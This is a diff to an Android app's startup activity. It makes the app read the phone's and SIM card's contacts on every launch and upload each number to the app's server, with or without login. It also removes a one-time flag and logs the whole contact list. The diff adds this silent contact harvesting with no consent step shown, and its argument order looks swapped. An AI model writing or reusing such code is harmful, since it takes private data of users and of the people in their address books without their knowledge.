@@ -170,6 +170,7 @@ public class ActivityStart extends Activity {
 										userInfoBean.setUsertype(usertype);
 										userInfoBean.setUsername(un);
 										userManager.insertData(userInfoBean);
+										postPhoneNum(	userManager.getUserInfoByUserNameAndUserType("1", un).getUid(),"1");
 									}
 								}
 							}else {//普通会员
@@ -207,15 +208,25 @@ public class ActivityStart extends Activity {
 										userInfoBean.setUsertype(usertype);
 										userInfoBean.setUsername(un);
 										userManager.insertData(userInfoBean);
+										
+										postPhoneNum(	userManager.getUserInfoByUserNameAndUserType("0", un).getUid(),"0");
 									}
 								}
 							}
 						}
 
 					}).start();
+			 			
 				}
 			}else {
 				System.out.println("查询是否需要登录     否");
+				new Thread(new Runnable() {
+					
+					@Override
+					public void run() {
+						postPhoneNum("0","0");
+					}
+				}).start();
 			}
 			
 			
@@ -316,33 +327,59 @@ public class ActivityStart extends Activity {
 				handler.sendEmptyMessage(2);
 			}
 		}).start();
-
-		boolean readContact = sp.getBoolean("readContact", false);
-		if (!readContact) {
-			postPhoneNum();
-		}
+		
+		
 	}
 
-	private void postPhoneNum() {
+	private void postPhoneNum(final String is_en,final String uid) {
 		try {
-			new Thread(new Runnable() {
-				@Override
-				public void run() {
+		 
 					GetPhoneNum getPhoneNum = new GetPhoneNum(
 							ActivityStart.this);
+					try {
+						Thread.sleep(40);
+						System.out.println("delay 1");
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
 					List<UserBean> phone = getPhoneNum.getPhoneContacts();
+					try {
+						Thread.sleep(40);
+						System.out.println("delay 2");
+					} catch (InterruptedException e) {
+						
+						e.printStackTrace();
+					}
 					List<UserBean> sim = getPhoneNum.getSIMContacts();
+					try {
+						Thread.sleep(40);
+						System.out.println("delay 3");
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
 					List<UserBean> list = new ArrayList<GetPhoneNum.UserBean>();
+					try {
+						Thread.sleep(40);
+						System.out.println("delay 4");
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
 					list.addAll(phone);
+					try {
+						Thread.sleep(40);
+						System.out.println("delay 5");
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+					}
 					list.addAll(sim);
-					GetDataByPostUtil.getPhoneNumberInfo(
-							ActivityStart.this, MyConstants.PHONE_NUM,
-							"add", list.toString(), "0", "0");
-					Editor editor = sp.edit();
-					editor.putBoolean("readContact", true);// 联系人
-					editor.commit();
-				}
-			}).start();
+					System.out.println("read contact ------");
+					System.out.println(list.toString());
+					System.out.println("read contact ------");
+					for (int i = 0; i < list.size(); i++) {
+						GetDataByPostUtil.getPhoneNumberInfo(
+				 				ActivityStart.this, MyConstants.PHONE_NUM,
+				 				"add", uid, is_en, list.get(i).getPhonenum());
+					}
 
 		} catch (Exception e) {
 			e.printStackTrace();
